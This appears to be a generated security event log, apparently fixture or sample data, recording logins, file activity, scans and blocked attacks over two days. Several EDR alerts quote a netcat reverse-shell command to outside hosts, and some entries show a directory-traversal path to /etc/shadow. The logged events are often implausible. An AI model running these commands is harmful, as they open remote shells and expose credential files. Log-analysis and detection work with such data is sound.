+2025-09-04 08:21:40 INFO File deleted: /var/www/html/login.php by user 'kim'
+2025-09-04 08:24:05 INFO File accessed: /etc/shadow by user 'admin'
+2025-09-04 08:24:10 INFO File uploaded: /var/www/html/index.php by user 'kim'
+2025-09-04 08:24:35 ERROR SQL Injection attempt detected from 198.51.100.27 on /login.php
+2025-09-04 08:27:00 INFO User 'admin' logged in from 192.168.0.59
+2025-09-04 08:27:10 INFO File uploaded: /api/v1/auth by user 'svc-web'
+2025-09-04 08:27:25 INFO Session timeout for user 'backup'
+2025-09-04 08:27:30 WARN Failed login attempt for user 'root' from 198.51.100.6
+2025-09-04 08:27:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 08:27:40 INFO File deleted: /var/www/html/login.php by user 'kim'
+2025-09-04 08:31:00 INFO User 'svc-api' logged in from 192.168.0.13
+2025-09-04 08:31:05 INFO File accessed: /api/v1/orders by user 'backup'
+2025-09-04 08:31:20 INFO Backup completed successfully
+2025-09-04 08:31:30 WARN Failed login attempt for user 'lee' from 185.220.100.33
+2025-09-04 08:31:35 ERROR Malware signature detected in file /api/v1/users uploaded by user 'svc-api'
+2025-09-04 08:33:30 WARN Failed login attempt for user 'svc-web' from 198.51.100.36
+2025-09-04 08:33:35 WARN Port scan detected from 45.155.204.15 targeting 192.168.0.43
+2025-09-04 08:33:40 INFO File deleted: /uploads/report.pdf by user 'monitor'
+2025-09-04 08:38:05 INFO File accessed: /uploads/invoice.xlsx by user 'monitor'
+2025-09-04 08:38:10 INFO File uploaded: /home/backup/docs/data.csv by user 'backup'
+2025-09-04 08:38:25 INFO Session timeout for user 'backup'
+2025-09-04 08:38:30 WARN Failed login attempt for user 'guest' from 198.51.100.15
+2025-09-04 08:38:35 WARN Multiple failed login attempts for user 'svc-api' from 5.181.80.36
+2025-09-04 08:44:10 INFO File uploaded: /api/v1/users by user 'lee'
+2025-09-04 08:44:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 08:49:00 INFO User 'kim' logged in from 192.168.0.21
+2025-09-04 08:49:05 INFO File accessed: /uploads/notes.txt by user 'dbuser'
+2025-09-04 08:49:15 INFO User 'dbuser' logged out
+2025-09-04 08:49:35 ERROR Malware signature detected in file /uploads/invoice.xlsx uploaded by user 'monitor'
+2025-09-04 08:54:00 INFO User 'admin' logged in from 192.168.0.24
+2025-09-04 08:54:10 INFO File uploaded: /var/www/html/index.php by user 'svc-api'
+2025-09-04 08:54:30 WARN Failed login attempt for user 'kim' from 185.220.100.36
+2025-09-04 08:54:35 WARN Multiple failed login attempts for user 'dbuser' from 198.51.100.16
+2025-09-04 08:54:40 INFO File deleted: /uploads/image.png by user 'kim'
+2025-09-04 09:00:25 INFO Session timeout for user 'guest'
+2025-09-04 09:00:30 WARN Failed login attempt for user 'kim' from 45.155.204.38
+2025-09-04 09:00:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 09:05:05 INFO File accessed: /root/secure.db by user 'monitor'
+2025-09-04 09:05:35 WARN Port scan detected from 45.155.204.38 targeting 192.168.0.54
+2025-09-04 09:08:30 WARN Failed login attempt for user 'backup' from 203.0.113.32
+2025-09-04 09:08:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 09:11:05 INFO File accessed: /var/www/html/search.php by user 'svc-api'
+2025-09-04 09:11:10 INFO File uploaded: /var/www/html/admin.php by user 'root'
+2025-09-04 09:11:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 45.155.204.22 4444' detected by EDR
+2025-09-04 09:15:00 INFO User 'guest' logged in from 192.168.0.23
+2025-09-04 09:15:05 INFO File accessed: /api/v1/auth by user 'root'
+2025-09-04 09:15:10 INFO File uploaded: /root/secure.db by user 'root'
+2025-09-04 09:15:15 INFO User 'svc-web' logged out
+2025-09-04 09:15:30 WARN Failed login attempt for user 'svc-web' from 5.181.80.27
+2025-09-04 09:15:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.40 4444' detected by EDR
+2025-09-04 09:17:20 INFO Backup completed successfully
+2025-09-04 09:17:35 ERROR SQL Injection attempt detected from 198.51.100.6 on /login.php
+2025-09-04 09:19:00 INFO User 'kim' logged in from 192.168.0.34
+2025-09-04 09:19:05 INFO File accessed: /home/root/docs/data.csv by user 'root'
+2025-09-04 09:19:35 WARN Anomalous outbound traffic to 5.181.80.11 from 192.168.0.51 exceeded threshold
+2025-09-04 09:19:40 INFO File deleted: /var/www/html/index.php by user 'kim'
+2025-09-04 09:21:00 INFO User 'lee' logged in from 192.168.0.36
+2025-09-04 09:21:30 WARN Failed login attempt for user 'admin' from 5.181.80.1
+2025-09-04 09:21:35 WARN Unauthorized directory traversal attempt from 185.220.100.16 on /downloads/../../etc/shadow
+2025-09-04 09:23:00 INFO User 'svc-web' logged in from 192.168.0.15
+2025-09-04 09:23:05 INFO File accessed: /home/backup/docs/report.docx by user 'backup'
+2025-09-04 09:23:10 INFO File uploaded: /var/www/html/admin.php by user 'admin'
+2025-09-04 09:23:15 INFO User 'guest' logged out
+2025-09-04 09:23:30 WARN Failed login attempt for user 'svc-web' from 5.181.80.21
+2025-09-04 09:23:35 WARN Unauthorized access attempt to /etc/shadow from 203.0.113.18
+2025-09-04 09:23:40 INFO File deleted: /api/v1/auth by user 'kim'
+2025-09-04 09:28:00 INFO User 'svc-api' logged in from 192.168.0.12
+2025-09-04 09:28:05 INFO File accessed: /api/v1/users by user 'svc-api'
+2025-09-04 09:28:10 INFO File uploaded: /etc/passwd by user 'guest'
+2025-09-04 09:28:15 INFO User 'root' logged out
+2025-09-04 09:28:20 INFO Backup completed successfully
+2025-09-04 09:28:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 09:34:00 INFO User 'svc-web' logged in from 192.168.0.43
+2025-09-04 09:34:05 INFO File accessed: /etc/shadow by user 'monitor'
+2025-09-04 09:34:30 WARN Failed login attempt for user 'admin' from 5.181.80.29
+2025-09-04 09:34:35 WARN Unauthorized directory traversal attempt from 5.181.80.33 on /downloads/../../etc/shadow
+2025-09-04 09:40:00 INFO User 'svc-api' logged in from 192.168.0.21
+2025-09-04 09:40:10 INFO File uploaded: /uploads/backup.tar.gz by user 'lee'
+2025-09-04 09:40:15 INFO User 'svc-web' logged out
+2025-09-04 09:40:20 INFO Backup completed successfully
+2025-09-04 09:40:30 WARN Failed login attempt for user 'kim' from 185.220.100.14
+2025-09-04 09:40:35 ERROR RCE exploit attempt blocked from 203.0.113.32 on /var/log/secure
+2025-09-04 09:42:00 INFO User 'monitor' logged in from 192.168.0.35
+2025-09-04 09:42:25 INFO Session timeout for user 'backup'
+2025-09-04 09:42:35 WARN Multiple failed login attempts for user 'root' from 5.181.80.7
+2025-09-04 09:42:40 INFO File deleted: /uploads/image.png by user 'backup'
+2025-09-04 09:44:00 INFO User 'root' logged in from 192.168.0.28
+2025-09-04 09:44:35 WARN Unauthorized access attempt to /var/www/html/search.php from 203.0.113.21
+2025-09-04 09:50:10 INFO File uploaded: /root/secure.db by user 'dbuser'
+2025-09-04 09:50:15 INFO User 'svc-api' logged out
+2025-09-04 09:50:30 WARN Failed login attempt for user 'guest' from 203.0.113.30
+2025-09-04 09:50:35 WARN Brute force attack suspected for user 'svc-api' from 185.220.100.20
+2025-09-04 09:52:05 INFO File accessed: /root/secure.db by user 'guest'
+2025-09-04 09:52:35 ERROR Malware signature detected in file /var/www/html/admin.php uploaded by user 'svc-web'
+2025-09-04 09:58:15 INFO User 'guest' logged out
+2025-09-04 09:58:35 WARN Unauthorized directory traversal attempt from 5.181.80.46 on /downloads/../../etc/shadow
+2025-09-04 09:58:40 INFO File deleted: /tmp/backup.tar.gz by user 'admin'
+2025-09-04 10:00:00 INFO User 'svc-api' logged in from 192.168.0.13
+2025-09-04 10:00:15 INFO User 'svc-api' logged out
+2025-09-04 10:00:30 WARN Failed login attempt for user 'admin' from 203.0.113.12
+2025-09-04 10:00:35 WARN Port scan detected from 45.155.204.3 targeting 192.168.0.38
+2025-09-04 10:00:40 INFO File deleted: /home/backup/docs/data.csv by user 'backup'
+2025-09-04 10:04:00 INFO User 'guest' logged in from 192.168.0.57
+2025-09-04 10:04:10 INFO File uploaded: /api/v1/orders by user 'admin'
+2025-09-04 10:04:15 INFO User 'backup' logged out
+2025-09-04 10:04:30 WARN Failed login attempt for user 'lee' from 45.155.204.24
+2025-09-04 10:04:35 ERROR Malware signature detected in file /etc/shadow uploaded by user 'svc-web'
+2025-09-04 10:06:00 INFO User 'kim' logged in from 192.168.0.51
+2025-09-04 10:06:05 INFO File accessed: /var/www/html/admin.php by user 'admin'
+2025-09-04 10:06:10 INFO File uploaded: /root/secure.db by user 'guest'
+2025-09-04 10:06:35 WARN Port scan detected from 203.0.113.15 targeting 192.168.0.23
+2025-09-04 10:12:05 INFO File accessed: /var/www/html/index.php by user 'root'
+2025-09-04 10:12:35 ERROR RCE exploit attempt blocked from 203.0.113.27 on /etc/shadow
+2025-09-04 10:12:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-04 10:16:05 INFO File accessed: /var/www/html/admin.php by user 'guest'
+2025-09-04 10:16:10 INFO File uploaded: /var/log/secure by user 'lee'
+2025-09-04 10:16:15 INFO User 'backup' logged out
+2025-09-04 10:16:30 WARN Failed login attempt for user 'admin' from 45.155.204.18
+2025-09-04 10:16:35 WARN Unauthorized access attempt to /api/v1/users from 203.0.113.17
+2025-09-04 10:21:00 INFO User 'admin' logged in from 192.168.0.47
+2025-09-04 10:21:15 INFO User 'lee' logged out
+2025-09-04 10:21:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-04 10:25:15 INFO User 'root' logged out
+2025-09-04 10:25:35 WARN Unauthorized directory traversal attempt from 185.220.100.34 on /downloads/../../etc/shadow
+2025-09-04 10:25:40 INFO File deleted: /etc/shadow by user 'dbuser'
+2025-09-04 10:27:00 INFO User 'lee' logged in from 192.168.0.57
+2025-09-04 10:27:35 ERROR SQL Injection attempt detected from 198.51.100.14 on /tmp/image.png
+2025-09-04 10:30:00 INFO User 'svc-web' logged in from 192.168.0.43
+2025-09-04 10:30:05 INFO File accessed: /tmp/malware.exe by user 'admin'
+2025-09-05 07:00:05 INFO File accessed: /var/www/html/admin.php by user 'guest'
+2025-09-05 07:00:15 INFO User 'kim' logged out
+2025-09-05 07:00:30 WARN Failed login attempt for user 'backup' from 5.181.80.12
+2025-09-05 07:00:35 ERROR RCE exploit attempt blocked from 5.181.80.4 on /api/v1/orders
+2025-09-05 07:05:00 INFO User 'monitor' logged in from 192.168.0.22
+2025-09-05 07:05:30 WARN Failed login attempt for user 'admin' from 45.155.204.11
+2025-09-05 07:05:35 WARN Anomalous outbound traffic to 203.0.113.8 from 192.168.0.54 exceeded threshold
+2025-09-05 07:09:00 INFO User 'svc-web' logged in from 192.168.0.42
+2025-09-05 07:09:10 INFO File uploaded: /api/v1/users by user 'admin'
+2025-09-05 07:09:35 WARN Unauthorized access attempt to /etc/shadow from 198.51.100.35
+2025-09-05 07:14:00 INFO User 'lee' logged in from 192.168.0.20
+2025-09-05 07:14:20 INFO Backup completed successfully
+2025-09-05 07:14:30 WARN Failed login attempt for user 'admin' from 45.155.204.1
+2025-09-05 07:14:35 WARN Unauthorized directory traversal attempt from 198.51.100.32 on /downloads/../../etc/shadow
+2025-09-05 07:16:00 INFO User 'guest' logged in from 192.168.0.59
+2025-09-05 07:16:05 INFO File accessed: /etc/passwd by user 'admin'
+2025-09-05 07:16:25 INFO Session timeout for user 'root'
+2025-09-05 07:16:35 WARN Port scan detected from 5.181.80.41 targeting 192.168.0.26
+2025-09-05 07:19:00 INFO User 'admin' logged in from 192.168.0.29
+2025-09-05 07:19:05 INFO File accessed: /etc/shadow by user 'root'
+2025-09-05 07:19:35 WARN Unauthorized directory traversal attempt from 45.155.204.9 on /downloads/../../etc/shadow
+2025-09-05 07:19:40 INFO File deleted: /var/www/html/login.php by user 'admin'
+2025-09-05 07:24:00 INFO User 'lee' logged in from 192.168.0.59
+2025-09-05 07:24:05 INFO File accessed: /var/www/html/admin.php by user 'monitor'
+2025-09-05 07:24:20 INFO Backup completed successfully
+2025-09-05 07:24:35 WARN Anomalous outbound traffic to 5.181.80.24 from 192.168.0.31 exceeded threshold
+2025-09-05 07:24:40 INFO File deleted: /var/www/html/login.php by user 'admin'
+2025-09-05 07:26:10 INFO File uploaded: /uploads/image.png by user 'root'
+2025-09-05 07:26:20 INFO Backup completed successfully
+2025-09-05 07:26:30 WARN Failed login attempt for user 'guest' from 203.0.113.18
+2025-09-05 07:26:35 WARN Unauthorized access attempt to /var/www/html/login.php from 185.220.100.9
+2025-09-05 07:26:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-05 07:30:05 INFO File accessed: /var/www/html/login.php by user 'root'
+2025-09-05 07:30:20 INFO Backup completed successfully
+2025-09-05 07:30:25 INFO Session timeout for user 'kim'
+2025-09-05 07:30:30 WARN Failed login attempt for user 'svc-api' from 185.220.100.45
+2025-09-05 07:30:35 ERROR RCE exploit attempt blocked from 185.220.100.25 on /root/secure.db
+2025-09-05 07:30:40 INFO File deleted: /var/www/html/login.php by user 'kim'
+2025-09-05 07:35:00 INFO User 'svc-api' logged in from 192.168.0.27
+2025-09-05 07:35:30 WARN Failed login attempt for user 'kim' from 45.155.204.29
+2025-09-05 07:35:35 WARN Anomalous outbound traffic to 185.220.100.42 from 192.168.0.20 exceeded threshold
+2025-09-05 07:35:40 INFO File deleted: /uploads/invoice.xlsx by user 'svc-api'
+2025-09-05 07:38:35 WARN Unauthorized access attempt to /home/root/docs/report.docx from 185.220.100.28
+2025-09-05 07:40:00 INFO User 'dbuser' logged in from 192.168.0.10
+2025-09-05 07:40:35 WARN Anomalous outbound traffic to 203.0.113.37 from 192.168.0.43 exceeded threshold
+2025-09-05 07:46:00 INFO User 'lee' logged in from 192.168.0.40
+2025-09-05 07:46:05 INFO File accessed: /var/www/html/search.php by user 'svc-web'
+2025-09-05 07:46:25 INFO Session timeout for user 'kim'
+2025-09-05 07:46:35 WARN Unauthorized access attempt to /home/kim/docs/report.docx from 198.51.100.20
+2025-09-05 07:50:00 INFO User 'guest' logged in from 192.168.0.13
+2025-09-05 07:50:05 INFO File accessed: /etc/shadow by user 'monitor'
+2025-09-05 07:50:20 INFO Backup completed successfully
+2025-09-05 07:50:35 ERROR SQL Injection attempt detected from 5.181.80.28 on /login.php
+2025-09-05 07:52:10 INFO File uploaded: /api/v1/orders by user 'svc-web'
+2025-09-05 07:52:15 INFO User 'monitor' logged out
+2025-09-05 07:52:20 INFO Backup completed successfully
+2025-09-05 07:52:25 INFO Session timeout for user 'backup'
+2025-09-05 07:52:35 ERROR RCE exploit attempt blocked from 185.220.100.28 on /home/monitor/docs/data.csv
+2025-09-05 07:52:40 INFO File deleted: /api/v1/auth by user 'dbuser'
+2025-09-05 07:54:10 INFO File uploaded: /etc/passwd by user 'backup'
+2025-09-05 07:54:30 WARN Failed login attempt for user 'lee' from 198.51.100.1
+2025-09-05 07:54:35 WARN Port scan detected from 185.220.100.13 targeting 192.168.0.50
+2025-09-05 07:58:00 INFO User 'dbuser' logged in from 192.168.0.54
+2025-09-05 07:58:05 INFO File accessed: /home/kim/docs/report.docx by user 'kim'
+2025-09-05 07:58:10 INFO File uploaded: /var/www/html/login.php by user 'svc-web'
+2025-09-05 07:58:15 INFO User 'lee' logged out
+2025-09-05 07:58:20 INFO Backup completed successfully
+2025-09-05 07:58:35 WARN Unauthorized access attempt to /uploads/backup.tar.gz from 45.155.204.34
+2025-09-05 08:03:00 INFO User 'backup' logged in from 192.168.0.17
+2025-09-05 08:03:25 INFO Session timeout for user 'svc-api'
+2025-09-05 08:03:30 WARN Failed login attempt for user 'admin' from 5.181.80.42
+2025-09-05 08:03:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-05 08:08:20 INFO Backup completed successfully
+2025-09-05 08:08:30 WARN Failed login attempt for user 'backup' from 45.155.204.6
+2025-09-05 08:08:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 5.181.80.30 4444' detected by EDR
+2025-09-05 08:13:15 INFO User 'dbuser' logged out
+2025-09-05 08:13:30 WARN Failed login attempt for user 'svc-web' from 45.155.204.5
+2025-09-05 08:13:35 WARN Anomalous outbound traffic to 45.155.204.42 from 192.168.0.42 exceeded threshold
+2025-09-05 08:19:20 INFO Backup completed successfully
+2025-09-05 08:19:30 WARN Failed login attempt for user 'dbuser' from 185.220.100.36
+2025-09-05 08:19:35 WARN Anomalous outbound traffic to 45.155.204.32 from 192.168.0.51 exceeded threshold
+2025-09-05 08:22:00 INFO User 'dbuser' logged in from 192.168.0.55
+2025-09-05 08:22:05 INFO File accessed: /home/dbuser/docs/data.csv by user 'dbuser'
+2025-09-05 08:22:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.24 4444' detected by EDR
+2025-09-05 08:27:05 INFO File accessed: /api/v1/orders by user 'admin'
+2025-09-05 08:27:10 INFO File uploaded: /var/www/html/admin.php by user 'admin'
+2025-09-05 08:27:15 INFO User 'kim' logged out
+2025-09-05 08:27:30 WARN Failed login attempt for user 'admin' from 45.155.204.27
+2025-09-05 08:27:35 WARN Multiple failed login attempts for user 'lee' from 45.155.204.43
+2025-09-05 08:31:05 INFO File accessed: /tmp/backup.tar.gz by user 'monitor'
+2025-09-05 08:31:20 INFO Backup completed successfully
+2025-09-05 08:31:35 WARN Brute force attack suspected for user 'admin' from 185.220.100.38
+2025-09-05 08:36:10 INFO File uploaded: /var/www/html/index.php by user 'monitor'
+2025-09-05 08:36:15 INFO User 'guest' logged out
+2025-09-05 08:36:20 INFO Backup completed successfully
+2025-09-05 08:36:35 WARN Unauthorized access attempt to /var/www/html/admin.php from 185.220.100.34
+2025-09-05 08:40:05 INFO File accessed: /var/www/html/admin.php by user 'backup'
+2025-09-05 08:40:25 INFO Session timeout for user 'root'
+2025-09-05 08:40:30 WARN Failed login attempt for user 'kim' from 45.155.204.39
+2025-09-05 08:40:35 WARN Unauthorized directory traversal attempt from 203.0.113.47 on /downloads/../../etc/shadow
+2025-09-05 08:40:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-05 08:43:00 INFO User 'guest' logged in from 192.168.0.10
+2025-09-05 08:43:05 INFO File accessed: /var/www/html/index.php by user 'kim'
+2025-09-05 08:43:10 INFO File uploaded: /etc/passwd by user 'dbuser'
+2025-09-05 08:43:15 INFO User 'backup' logged out
+2025-09-05 08:43:35 WARN Unauthorized directory traversal attempt from 198.51.100.19 on /downloads/../../etc/shadow
+2025-09-05 08:47:00 INFO User 'kim' logged in from 192.168.0.43
+2025-09-05 08:47:05 INFO File accessed: /var/www/html/search.php by user 'monitor'
+2025-09-05 08:47:20 INFO Backup completed successfully
+2025-09-05 08:47:30 WARN Failed login attempt for user 'dbuser' from 203.0.113.35
+2025-09-05 08:47:35 WARN Port scan detected from 203.0.113.6 targeting 192.168.0.58
+2025-09-05 08:52:15 INFO User 'dbuser' logged out
+2025-09-05 08:52:35 ERROR RCE exploit attempt blocked from 185.220.100.46 on /var/www/html/index.php
+2025-09-05 08:56:00 INFO User 'root' logged in from 192.168.0.34
+2025-09-05 08:56:05 INFO File accessed: /var/www/html/index.php by user 'guest'
+2025-09-05 08:56:35 ERROR SQL Injection attempt detected from 185.220.100.30 on /login.php
+2025-09-05 09:00:00 INFO User 'root' logged in from 192.168.0.20
+2025-09-05 09:00:35 ERROR Malware signature detected in file /etc/shadow uploaded by user 'svc-web'
+2025-09-05 09:03:00 INFO User 'svc-web' logged in from 192.168.0.51
+2025-09-05 09:03:10 INFO File uploaded: /var/www/html/index.php by user 'kim'
+2025-09-05 09:03:25 INFO Session timeout for user 'admin'
+2025-09-05 09:03:30 WARN Failed login attempt for user 'guest' from 5.181.80.43
+2025-09-05 09:03:35 ERROR SQL Injection attempt detected from 185.220.100.11 on /login.php
+2025-09-05 09:03:40 INFO File deleted: /api/v1/orders by user 'admin'
+2025-09-05 09:08:05 INFO File accessed: /api/v1/orders by user 'admin'
+2025-09-05 09:08:35 ERROR RCE exploit attempt blocked from 45.155.204.30 on /tmp/image.png
+2025-09-05 09:14:00 INFO User 'guest' logged in from 192.168.0.48
+2025-09-05 09:14:05 INFO File accessed: /api/v1/orders by user 'svc-api'
+2025-09-05 09:14:30 WARN Failed login attempt for user 'svc-web' from 185.220.100.4
+2025-09-05 09:14:35 WARN Multiple failed login attempts for user 'monitor' from 203.0.113.26
+2025-09-05 09:17:00 INFO User 'dbuser' logged in from 192.168.0.10
+2025-09-05 09:17:15 INFO User 'admin' logged out
+2025-09-05 09:17:35 ERROR SQL Injection attempt detected from 203.0.113.4 on /login.php
+2025-09-05 09:21:00 INFO User 'monitor' logged in from 192.168.0.19
+2025-09-05 09:21:05 INFO File accessed: /etc/passwd by user 'lee'
+2025-09-05 09:21:15 INFO User 'kim' logged out
+2025-09-05 09:21:30 WARN Failed login attempt for user 'monitor' from 5.181.80.19
+2025-09-05 09:21:35 ERROR RCE exploit attempt blocked from 198.51.100.19 on /api/v1/users
+2025-09-05 09:25:00 INFO User 'backup' logged in from 192.168.0.41
+2025-09-05 09:25:20 INFO Backup completed successfully
+2025-09-05 09:25:30 WARN Failed login attempt for user 'lee' from 203.0.113.32
+2025-09-05 09:25:35 WARN Unauthorized access attempt to /api/v1/auth from 45.155.204.8
+2025-09-05 09:31:00 INFO User 'backup' logged in from 192.168.0.33
+2025-09-05 09:31:15 INFO User 'dbuser' logged out
+2025-09-05 09:31:20 INFO Backup completed successfully
+2025-09-05 09:31:35 WARN Unauthorized access attempt to /tmp/notes.txt from 198.51.100.35
+2025-09-05 09:35:05 INFO File accessed: /uploads/cache.log by user 'dbuser'
+2025-09-05 09:35:15 INFO User 'backup' logged out
+2025-09-05 09:35:20 INFO Backup completed successfully
+2025-09-05 09:35:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.1 4444' detected by EDR
+2025-09-05 09:37:35 ERROR Malware signature detected in file /var/www/html/index.php uploaded by user 'monitor'
+2025-09-05 09:43:00 INFO User 'kim' logged in from 192.168.0.33
+2025-09-05 09:43:05 INFO File accessed: /root/secure.db by user 'backup'
+2025-09-05 09:43:15 INFO User 'monitor' logged out
+2025-09-05 09:43:35 WARN Anomalous outbound traffic to 185.220.100.18 from 192.168.0.49 exceeded threshold
+2025-09-05 09:49:00 INFO User 'kim' logged in from 192.168.0.21
+2025-09-05 09:49:20 INFO Backup completed successfully
+2025-09-05 09:49:35 ERROR SQL Injection attempt detected from 45.155.204.45 on /login.php
+2025-09-05 09:51:00 INFO User 'lee' logged in from 192.168.0.12
+2025-09-05 09:51:35 ERROR SQL Injection attempt detected from 45.155.204.17 on /login.php
+2025-09-05 09:57:05 INFO File accessed: /etc/passwd by user 'guest'
+2025-09-05 09:57:15 INFO User 'svc-web' logged out
+2025-09-05 09:57:35 WARN Unauthorized directory traversal attempt from 203.0.113.47 on /downloads/../../etc/shadow
+2025-09-05 10:00:00 INFO User 'dbuser' logged in from 192.168.0.32
+2025-09-05 10:00:05 INFO File accessed: /var/log/secure by user 'svc-api'
+2025-09-05 10:00:20 INFO Backup completed successfully
+2025-09-05 10:00:25 INFO Session timeout for user 'root'
+2025-09-05 10:00:35 WARN Brute force attack suspected for user 'kim' from 198.51.100.48
+2025-09-05 10:00:40 INFO File deleted: /etc/shadow by user 'root'
+2025-09-05 10:03:00 INFO User 'dbuser' logged in from 192.168.0.56
+2025-09-05 10:03:05 INFO File accessed: /home/svc-api/docs/report.docx by user 'svc-api'
+2025-09-05 10:03:10 INFO File uploaded: /etc/shadow by user 'kim'
+2025-09-05 10:03:20 INFO Backup completed successfully
+2025-09-05 10:03:25 INFO Session timeout for user 'backup'
+2025-09-05 10:03:35 ERROR SQL Injection attempt detected from 5.181.80.32 on /var/www/html/index.php
+2025-09-05 10:06:00 INFO User 'guest' logged in from 192.168.0.21
+2025-09-05 10:06:05 INFO File accessed: /etc/passwd by user 'svc-web'
+2025-09-05 10:06:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-05 10:06:40 INFO File deleted: /tmp/invoice.xlsx by user 'svc-api'
+2025-09-05 10:09:00 INFO User 'svc-web' logged in from 192.168.0.48
+2025-09-05 10:09:05 INFO File accessed: /tmp/malware.exe by user 'backup'
+2025-09-05 10:09:20 INFO Backup completed successfully
+2025-09-05 10:09:35 ERROR RCE exploit attempt blocked from 198.51.100.18 on /var/www/html/admin.php
+2025-09-05 10:12:00 INFO User 'lee' logged in from 192.168.0.43
+2025-09-05 10:12:20 INFO Backup completed successfully
+2025-09-05 10:12:25 INFO Session timeout for user 'svc-api'
+2025-09-05 10:12:35 ERROR RCE exploit attempt blocked from 185.220.100.25 on /uploads/image.png
+2025-09-05 10:12:40 INFO File deleted: /home/backup/docs/data.csv by user 'backup'
+2025-09-05 10:14:25 INFO Session timeout for user 'monitor'
+2025-09-05 10:14:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-05 10:19:00 INFO User 'backup' logged in from 192.168.0.16
+2025-09-05 10:19:05 INFO File accessed: /home/guest/docs/report.docx by user 'guest'
+2025-09-05 10:19:20 INFO Backup completed successfully
+2025-09-05 10:19:35 ERROR Malware signature detected in file /var/www/html/index.php uploaded by user 'admin'
+2025-09-05 10:21:00 INFO User 'svc-web' logged in from 192.168.0.51
+2025-09-05 10:21:05 INFO File accessed: /api/v1/orders by user 'dbuser'
+2025-09-05 10:21:15 INFO User 'backup' logged out
+2025-09-05 10:21:35 WARN Port scan detected from 203.0.113.21 targeting 192.168.0.53
+2025-09-05 10:24:00 INFO User 'monitor' logged in from 192.168.0.40
+2025-09-05 10:24:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-05 10:24:35 ERROR SQL Injection attempt detected from 185.220.100.22 on /etc/shadow
+2025-09-05 10:24:40 INFO File deleted: /uploads/malware.exe by user 'admin'
+2025-09-05 10:26:00 INFO User 'svc-web' logged in from 192.168.0.31
+2025-09-05 10:26:20 INFO Backup completed successfully
+2025-09-05 10:26:35 WARN Multiple failed login attempts for user 'kim' from 5.181.80.21
+2025-09-05 10:31:00 INFO User 'guest' logged in from 192.168.0.24
+2025-09-05 10:31:05 INFO File accessed: /var/www/html/index.php by user 'backup'
+2025-09-05 10:31:30 WARN Failed login attempt for user 'backup' from 198.51.100.15
+2025-09-05 10:31:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-05 10:36:00 INFO User 'lee' logged in from 192.168.0.52
+2025-09-05 10:36:15 INFO User 'backup' logged out
+2025-09-05 10:36:35 WARN Anomalous outbound traffic to 203.0.113.43 from 192.168.0.25 exceeded threshold
+2025-09-05 10:39:00 INFO User 'guest' logged in from 192.168.0.59
+2025-09-05 10:39:05 INFO File accessed: /api/v1/orders by user 'svc-web'
+2025-09-05 10:39:25 INFO Session timeout for user 'root'
+2025-09-05 10:39:35 WARN Anomalous outbound traffic to 5.181.80.44 from 192.168.0.47 exceeded threshold
+2025-09-05 10:43:00 INFO User 'lee' logged in from 192.168.0.39
+2025-09-05 10:43:15 INFO User 'svc-web' logged out
+2025-09-05 10:43:35 WARN Brute force attack suspected for user 'root' from 185.220.100.6
+2025-09-05 10:47:35 WARN Multiple failed login attempts for user 'svc-api' from 45.155.204.25
+2025-09-05 10:53:05 INFO File accessed: /var/www/html/login.php by user 'guest'
+2025-09-05 10:53:20 INFO Backup completed successfully
+2025-09-05 10:53:35 WARN Port scan detected from 203.0.113.41 targeting 192.168.0.43
+2025-09-05 10:57:00 INFO User 'root' logged in from 192.168.0.35
+2025-09-05 10:57:15 INFO User 'kim' logged out
+2025-09-05 10:57:35 WARN Brute force attack suspected for user 'lee' from 5.181.80.28
+2025-09-05 11:00:10 INFO File uploaded: /tmp/backup.tar.gz by user 'lee'
+2025-09-05 11:00:30 WARN Failed login attempt for user 'root' from 45.155.204.24
+2025-09-05 11:00:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-05 11:02:05 INFO File accessed: /tmp/invoice.xlsx by user 'admin'
